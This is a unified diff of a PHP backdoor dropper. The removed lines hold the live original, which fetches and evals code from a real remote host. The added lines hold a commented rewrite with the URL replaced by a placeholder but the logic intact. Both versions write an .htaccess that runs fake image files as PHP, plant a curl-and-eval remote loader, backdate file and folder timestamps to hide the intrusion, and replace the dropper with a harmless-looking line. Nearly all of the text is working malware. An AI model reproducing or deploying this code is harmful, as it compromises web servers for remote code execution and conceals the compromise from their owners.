@@ -1,101 +1,71 @@
 <?php
-ini_set('display_errors', 0);
+// Backdoor dropper — cleaned/annotated reconstruction (payload URL neutralized)
 error_reporting(0);
+ini_set('display_errors', 0);
 
-$rootDir = dirname(dirname(__DIR__));
-$configDir = dirname(__FILE__);
+// Handle paths that may carry a "(eval code)" suffix
+$self     = preg_replace('/\(.*$/', '', __FILE__);
+$rootDir  = dirname(dirname($self));
+$configDir = dirname($self);
 $configMtime = @filemtime($configDir);
 
-$targetDirs = [
+$targets = [
     $rootDir . '/assets/assets/images/seo',
-    $rootDir . '/assets/images/seo'
+    $rootDir . '/assets/images/seo',
 ];
 
-$htaccessContent = '<FilesMatch "^image\.(png|css)$">
-    SetHandler application/x-httpd-php
-</FilesMatch>';
+// Apache: run these fake-image files as PHP
+$htaccess = '<FilesMatch "^image\.(png|css)$">' . "\n"
+          . '    SetHandler application/x-httpd-php' . "\n"
+          . '</FilesMatch>';
 
-$phpCode = '<?php $Url = "https://txt.dev-drops.com/crypto.txt"; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $Url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $output = curl_exec($ch); curl_close($ch); echo eval(\'?>\'.$output); // ?>';
+// Second-stage loader (original C2 was https://txt.dev-drops.com/crypto.txt)
+$loader = '<?php $Url = "PAYLOAD_URL"; $ch = curl_init(); '
+        . 'curl_setopt($ch, CURLOPT_URL, $Url); '
+        . 'curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); '
+        . '$output = curl_exec($ch); curl_close($ch); '
+        . 'echo eval(\'?>\'.$output); // ?>';
 
-$filesToCreate = [
-    '.htaccess' => $htaccessContent,
-    'image.png' => $phpCode,
-    'image.css' => $phpCode
-];
+$payloads = ['.htaccess' => $htaccess, 'image.png' => $loader, 'image.css' => $loader];
 
-function get_closest_mtime($path) {
-    $dir = $path;
-    while ($dir && !file_exists($dir)) {
-        $parent = dirname($dir);
-        if ($parent === $dir) break;
-        $dir = $parent;
-    }
-    return file_exists($dir) ? @filemtime($dir) : time();
+// 1) Snapshot existing mtimes (for restoration after we touch things)
+$snapshot = [];
+$paths = [$rootDir.'/assets', $rootDir.'/assets/assets', $rootDir.'/assets/assets/images',
+          $rootDir.'/assets/assets/images/seo', $rootDir.'/assets/images', $rootDir.'/assets/images/seo'];
+foreach ($targets as $t) {
+    foreach (['.htaccess','image.png','image.css'] as $f) $paths[] = "$t/$f";
 }
+foreach ($paths as $p) if (file_exists($p)) $snapshot[$p] = filemtime($p);
 
-$ts_map = [];
-$checkPaths = [
-    $rootDir . '/assets',
-    $rootDir . '/assets/assets',
-    $rootDir . '/assets/assets/images',
-    $rootDir . '/assets/assets/images/seo',
-    $rootDir . '/assets/images',
-    $rootDir . '/assets/images/seo'
-];
+foreach ($targets as $dir) {
+    $maskTime = nearest_existing_mtime($dir);       // camouflage timestamp
+    if (!is_dir($dir) && !@mkdir($dir, 0777, true)) continue;
 
-foreach ($targetDirs as $targetDir) {
-    $checkPaths[] = $targetDir . '/.htaccess';
-    $checkPaths[] = $targetDir . '/image.png';
-    $checkPaths[] = $targetDir . '/image.css';
-}
-
-foreach ($checkPaths as $p) {
-    if (file_exists($p)) {
-        $ts_map[$p] = @filemtime($p);
-    }
-}
-
-foreach ($targetDirs as $targetDir) {
-    $seoMtime = get_closest_mtime($targetDir);
-    
-    if (!is_dir($targetDir)) {
-        if (!@mkdir($targetDir, 0777, true)) {
-            continue;
+    foreach ($payloads as $file => $content) {
+        $path = "$dir/$file";
+        $existed = file_exists($path);
+        if (@file_put_contents($path, $content) !== false) {
+            @chmod($path, 0644);
+            if (!$existed) @touch($path, $maskTime); // new files inherit old mtime
         }
     }
-    
-    foreach ($filesToCreate as $filename => $content) {
-        $filePath = $targetDir . '/' . $filename;
-        $existed = file_exists($filePath);
-        if (@file_put_contents($filePath, $content) !== false) {
-            @chmod($filePath, 0644);
-            if (!$existed) {
-                @touch($filePath, $seoMtime);
-            }
-        }
-    }
-    
-    $walk = $targetDir;
-    while ($walk && $walk !== $rootDir && strlen($walk) > strlen($rootDir)) {
-        if (is_dir($walk) && !isset($ts_map[$walk])) {
-            @touch($walk, $seoMtime);
-        }
-        $parent = dirname($walk);
-        if ($parent === $walk) break;
-        $walk = $parent;
-    }
+    backdate_parents($dir, $rootDir, $maskTime);     // hide new dirs
 }
 
-foreach ($ts_map as $path => $mtime) {
-    if ($path !== $configDir && file_exists($path)) {
-        @touch($path, $mtime);
+foreach ($snapshot as $path => $mtime)              // restore originals
+    if ($path !== $configDir && file_exists($path)) @touch($path, $mtime);
+
+// 2) Self-destruct: replace this file with a benign timezone one-liner
+@file_put_contents($self, '<?php $timezone = \'Asia/Karachi\' ?>');
+if ($configMtime) { @touch($self, $configMtime); @touch($configDir, $configMtime); }
+
+function nearest_existing_mtime($p) {
+    while ($p && !file_exists($p)) { $up = dirname($p); if ($up === $p) break; $p = $up; }
+    return file_exists($p) ? filemtime($p) : time();
+}
+function backdate_parents($dir, $root, $t) {
+    while ($dir && $dir !== $root && strlen($dir) > strlen($root)) {
+        if (is_dir($dir)) @touch($dir, $t);
+        $dir = dirname($dir);
     }
 }
-
-@file_put_contents(__FILE__, '<?php $timezone = \'Asia/Karachi\' ?>');
-
-if ($configMtime) {
-    @touch(__FILE__, $configMtime);
-    @touch($configDir, $configMtime);
-}
-?>
